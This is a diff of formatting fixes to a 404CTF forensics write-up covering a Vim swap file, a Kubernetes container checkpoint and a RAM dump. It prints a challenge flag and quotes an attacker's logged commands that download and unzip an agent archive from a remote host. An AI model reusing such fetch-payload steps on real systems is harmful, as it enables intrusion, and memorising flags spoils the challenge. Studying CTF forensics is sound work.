@@ -9,8 +9,7 @@ tag: "404CTF"
 slug: "forensics"
 language: "english"
 image: "/static/media/404ctf/event_logo.png"
-keywords:
-  ["Cybersecurity", "404CTF", "Cryptography"]
+keywords: ["Cybersecurity", "404CTF", "Cryptography"]
 links: ["reverse", "binary", "web"]
 ---
 
@@ -26,6 +25,7 @@ The flag is: `404CTF{35SY_W1r35h4rk}`
 ### Le Mystère du roman d’amour
 
 In this challenge, we are handed Vim swap file `fichier-etrange.swp` and to solve the challenge with must find:
+
 - the PID of the crashed process
 - the full path to the file in question (spaces allowed): both the exact form found in the challenge and the extended form beginning with / validate the challenge
 - the name of Rouletabille's (a character) friend
@@ -45,7 +45,7 @@ We then recover it by typing `:w restored.png` in vim.
 Here is the image we find:
 ![](/static/media/404ctf/mystere-du-roman-d-amour-1.png)
 
-We can then use `stegsolve` (*instructions in another blog post [here](/blog/404ctfs/stegano/#l%C5%93uvre)*). 
+We can then use `stegsolve` (_instructions in another blog post [here](/blog/404ctfs/stegano/#l%C5%93uvre)_).
 In `stegsolve` we can walk through the different color channels until we stumble upon something interesting: QR code.
 
 ![](/static/media/404ctf/mystere-du-roman-d-amour-2.png)
@@ -70,6 +70,7 @@ At first I tried if I can get the flag for free with it:
 ```bash
 grep -ir 404CTF checkpoint-bash_default-bash-2023-05-12T09:04:21Z
 ```
+
 No chance.
 
 Let's look at the files manually. A rather interesting file `io.kubernetes.cri-o`. In particular `io.kubernetes.cri-o.LogPath` logs everything that has been executed by the container in the Kubernetes cluster.
@@ -81,7 +82,7 @@ cat checkpoint-bash_default-bash-2023-05-12T09:04:21Z/io.kubernetes.cri-o.LogPat
 On this file, we can see that a user has become root. Close inspection of this file shows that the attacker is executing:
 
 ```bash
-....  
+....
 curl agent.challenges.404ctf.fr -o agent.zip
 unzip agent.zip
 ....
@@ -98,8 +99,7 @@ Soon enough, we come across the file `s3cr37.zip` in the `/Documents/perso` fold
 Cracking passwords can be time-consuming, so let's explore a more efficient method. While walking through the file system, I found a mysterious file named `C311M1N1-PC-20230514-200525.raw`.
 It could be anything but given the challenge's name, there's a chance that it could be a RAM (volatile memory) dump. A widely used tool for analyzing such dumps is [`volatility`](https://github.com/volatilityfoundation/volatility/wiki/Installation).
 
-
-*[This](https://cyberarms.wordpress.com/2011/11/04/memory-forensics-how-to-pull-passwords-from-a-memory-dump/) is one of the first articles I read about using the tool and also happens to be a good Introduction.*
+_[This](https://cyberarms.wordpress.com/2011/11/04/memory-forensics-how-to-pull-passwords-from-a-memory-dump/) is one of the first articles I read about using the tool and also happens to be a good Introduction._
 
 ```bash
 # Retrieve some information on the RAM dump
